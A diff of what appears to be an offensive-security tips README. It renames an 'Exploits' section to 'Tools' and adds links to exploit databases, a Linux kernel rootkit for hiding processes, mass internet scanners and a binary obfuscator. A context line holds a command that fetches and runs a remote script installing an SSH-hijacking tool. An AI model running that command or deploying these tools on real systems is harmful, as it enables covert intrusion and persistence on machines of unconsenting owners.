@@ -68,7 +68,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [with SSH-IT](#sshit-anchor)
 1. [Miscellaneous](#misc-anchor)
    1. [OSINT Intelligence Gathering](#osint-anchor)
-   1. [Exploits](#exploits)
+   1. [Tools](#tools)
    1. [Cool Linux commands](#cool-anchor)
    1. [tmux](#tmux-anchor)
    1. [Useful commands](#useful-anchor)  
@@ -839,11 +839,25 @@ bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 | https://cipher387.github.io/osint_stuff_tool_collection/ | OSINT tools collection |
 | https://osintframework.com/ | Many OSINT tools |
 
-<a id="exploits"></a>
-**10.ii. Exploits**
+<a id="Tools"></a>
+**10.ii. Tools**
 
-1. https://packetstormsecurity.com/
-1. https://www.exploit-db.com/
+Exploits
+1. https://packetstormsecurity.com/ - A trusted source ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
+1. https://www.exploit-db.com/ - Also includes metasploit db and google hacking db
+
+Backdoors
+1. https://github.com/m0nad/Diamorphine - Linux Kernel Module for hiding processes and files
+
+Mass Scanners
+1. https://github.com/robertdavidgraham/masscan - Scan the entire Internet
+1. https://github.com/ptrrkssn/pnscan - Fast network scanner
+1. https://zmap.io/ - ZMap & ZGrab
+
+Tools
+1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
+1. https://tmate.io/ - Share A screen with others
+
  
 <a id="cool-anchor"></a>
 **10.iii. Cool Linux commands**
